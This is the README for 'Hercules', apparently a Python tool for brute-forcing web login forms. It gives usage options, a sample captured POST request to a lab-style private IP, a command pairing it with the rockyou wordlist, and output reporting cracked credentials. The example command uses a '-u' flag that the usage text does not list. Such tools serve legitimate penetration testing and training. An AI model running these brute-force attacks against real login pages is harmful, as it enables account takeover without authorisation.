# Hercules

## Usage

```
usage: hercules.py [-h] -r request (-l username | -L file) (-p password | -P file) -f fail [-t threads]

options:
  -h, --help   show this help message and exit
  -r request   the raw HTTP/S request to emulate
  -l username  a single username to use in brute-force attack
  -L file      a list of usernames to use in brute-force attack
  -p password  a single password to use in brute-force attack
  -P file      a list of passwords to use in brute-force attack
  -f fail      the substring expected in unsuccessful attempt
  -t threads   the number of concurrent threads (default: 20)
```

## Example

```
POST /login HTTP/1.1
Host: 10.10.109.185
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.10.109.185
Connection: close
Referer: http://10.10.109.185/login
Cookie: connect.sid=s%3A9ju9aYkD9s4XxnSDzR6L60bfUKC2F9CA.Dz91qt37jOF3P22s%2B4rqQ%2BUbj5LSs6GGfF2SRBfTP1k
Upgrade-Insecure-Requests: 1

username=^USER^&password=^PASS^
```

```
./hercules.py -r examples/request.txt -u molly -P /usr/share/wordlists/rockyou.txt -f 'Your username or password is incorrect.'
```

```
Hercules v0.0.1 (c) 2022 by Anvbis
https://github.com/anvbis/hercules

hercules.py: info: starting attack at 2022-06-20 20:42:48.716611
hercules.py: info: using 1 usernames, 14344392 passwords; 14344392 tries, ~717219 tries per thread
hercules.py: info: valid credentials found; username=molly,password=111111

Progress   0%|                                                     |        1/14344392 [00:01<186d 1h 20:51, 0.89/s]
```
